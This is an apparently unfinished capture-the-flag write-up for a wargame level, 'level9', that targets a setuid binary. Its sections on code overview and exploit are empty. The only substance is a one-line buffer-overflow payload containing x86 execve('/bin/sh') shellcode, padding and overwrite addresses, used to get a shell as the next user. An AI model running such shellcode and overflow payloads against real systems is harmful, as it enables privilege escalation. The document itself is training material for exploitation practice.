# Level9

## 1. Context

```bash
$ id
uid=2009(level9) gid=2009(level9) groups=2009(level9),100(users)

$ pwd
/home/user/level9

$ ls -la
[...]
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
[...]
```

## 2. Program behavior

```bash
$ ./level9 
```

Does nothing...

## 3. Code overview


## 4. Exploit

## 5. Getting the flag

```bash
$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
```

End of simulation
